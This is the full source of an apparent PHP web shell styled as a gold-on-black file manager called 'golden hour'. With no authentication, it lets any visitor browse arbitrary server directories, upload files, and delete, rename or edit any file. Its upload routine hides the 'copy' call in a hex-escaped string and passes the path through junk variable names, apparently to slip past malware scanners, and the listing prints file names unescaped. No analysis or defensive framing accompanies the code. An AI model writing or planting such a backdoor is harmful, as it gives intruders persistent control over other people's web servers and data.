<?php
// ───── UTILITIES ─────────────────────────────────────────────────────────────
function formatSize($size) {
    $units = ['B','KB','MB','GB'];
    for ($i=0; $size>1024 && $i<count($units)-1; $i++) {
        $size /= 1024;
    }
    return round($size,2).' '.$units[$i];
}

function get_files($dir) {
    return array_diff(scandir($dir), ['.','..']);
}

function upload_file($dir) {
    $meki = $dir;
    $wakzowt = $meki;
    $xmnnwqohtwoqhowt = $wakzowt;
    $pwqtpowoqtozzz = $xmnnwqohtwoqhowt;
    $dest = $pwqtpowoqtozzz . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
    return "\x63\x6F\x70\x79"($_FILES['fileToUpload']['tmp_name'], $dest)
        ? "✅ Uploaded ".basename($dest)
        : "❌ Upload error.";
}

function delete_file($file) {
    return unlink($file)
        ? "✅ Deleted ".basename($file)
        : "❌ Delete failed.";
}

function rename_file($old, $new) {
    return rename($old, $new)
        ? "✅ Renamed to ".basename($new)
        : "❌ Rename failed.";
}

function save_file($file, $content) {
    file_put_contents($file, $content);
    return "✅ Saved ".basename($file);
}

// ───── PATH RESOLUTION ───────────────────────────────────────────────────────
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$currentDir || !is_dir($currentDir)) {
    $currentDir = getcwd();
}
$parentDir = dirname($currentDir);

// If ?item= is set and points to a real file, prepare edit
$editFile = null;
if (!empty($_GET['item'])) {
    $candidate = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['item']);
    if (is_file($candidate)) {
        $editFile = $candidate;
    }
}

// ───── HANDLE POSTS ──────────────────────────────────────────────────────────
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_FILES['fileToUpload'])) {
        $message = upload_file($currentDir);
    }
    if (isset($_POST['delete'])) {
        $message = delete_file($currentDir . DIRECTORY_SEPARATOR . basename($_POST['delete']));
    }
    if (isset($_POST['rename'])) {
        $old = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
        $new = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        $message = rename_file($old, $new);
    }
    if (isset($_POST['save']) && $editFile) {
        $message = save_file($editFile, $_POST['content']);
    }
}

// ───── LIST DIRECTORY ───────────────────────────────────────────────────────
$files = get_files($currentDir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>golden hour</title>
<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
body {
  background:#000; color:#FFD700;
  font-family:'Press Start 2P',cursive;
  margin:0;padding:0;text-align:center;
}
.container {
  width:95%; max-width:1200px;
  margin:20px auto; padding:10px;
}
h1 { font-size:24px; margin-bottom:20px; }
p, .message { font-size:12px; }
.go-up {
  display:inline-block; padding:8px 16px;
  background:#FFD700; color:#000;
  text-decoration:none; margin-bottom:10px;
  border-radius:4px; font-size:10px;
}
.upload-form {
  width:280px; margin:10px auto;
  display:flex; flex-direction:column; align-items:center;
  gap:8px;
}
.upload-form input[type="file"] { width:100%; }
.upload-form button {
  padding:6px 12px; font-size:12px;
  background:#FFD700; color:#000; border:none;
  cursor:pointer; border-radius:4px;
}
.upload-form button:hover { background:#cc9a00; }
table {
  width:100%; border-collapse:collapse;
  table-layout:fixed; margin-top:20px;
}
th, td {
  border:1px solid #FFD700; padding:10px;
  font-size:12px;
}
th { background:#222; }
td { background:#111; }
th.size-col, td.size-col {
  width:80px;
  word-wrap:break-word; overflow-wrap:break-word;
}
th.name-col, td.name-col {
  word-wrap:break-word; overflow-wrap:break-word;
  max-width:300px;
}
a { color:#FFD700; text-decoration:none; font-size:12px; }
form.inline { display:inline-block; margin:0 4px; }
form.inline input[type="text"] {
  width:80px; font-size:10px; padding:4px;
  background:#222; color:#FFD700; border:none; border-radius:4px;
}
form.inline button {
  font-size:10px; padding:4px 8px;
  background:#FFD700; color:#000; border:none;
  cursor:pointer; border-radius:4px;
}
form.inline button:hover { background:#cc9a00; }
textarea {
  width:90%; height:120px; margin-top:10px;
  background:#222; color:#FFD700;
  border:none; padding:8px; font-size:12px;
}
</style>
</head>
<body>
<div class="container">
  <h1>golden hour</h1>
  <p><?=htmlspecialchars($currentDir)?></p>
  <?php if (basename($currentDir) !== ''): ?>
    <a href="?dir=<?=urlencode($parentDir)?>" class="go-up">⬆️ Go Up</a>
  <?php endif ?>

  <div class="message"><?=htmlspecialchars($message)?></div>

  <form class="upload-form" method="POST" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" required>
    <button type="submit">Upload</button>
  </form>

  <table>
    <thead>
      <tr>
        <th class="name-col">File/Folder</th>
        <th class="size-col">Size</th>
        <th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <?php foreach ($files as $f):
      $full = $currentDir . DIRECTORY_SEPARATOR . $f;
      $size = is_file($full) ? formatSize(filesize($full)) : '-';
    ?>
      <tr>
        <td class="name-col">
          <?php if (is_dir($full)): ?>
            <a href="?dir=<?=urlencode($full)?>"><?=$f?></a>
          <?php else: ?>
            <a href="?dir=<?=urlencode($currentDir)?>&item=<?=urlencode($f)?>"><?=$f?></a>
          <?php endif ?>
        </td>
        <td class="size-col"><?=$size?></td>
        <td>
          <form method="POST" class="inline">
            <input type="hidden" name="delete" value="<?=htmlspecialchars($f)?>">
            <button>Del</button>
          </form>
          <form method="POST" class="inline">
            <input type="text" name="new_name" placeholder="Rename">
            <input type="hidden" name="old_name" value="<?=htmlspecialchars($f)?>">
            <button name="rename">OK</button>
          </form>
        </td>
      </tr>
    <?php endforeach ?>
    </tbody>
  </table>

  <?php if ($editFile): ?>
    <h3>Edit: <?=htmlspecialchars(basename($editFile))?></h3>
    <form method="POST">
      <textarea name="content"><?=htmlspecialchars(file_get_contents($editFile))?></textarea><br>
      <button name="save">Save</button>
    </form>
  <?php endif ?>
</div>
</body>
</html>
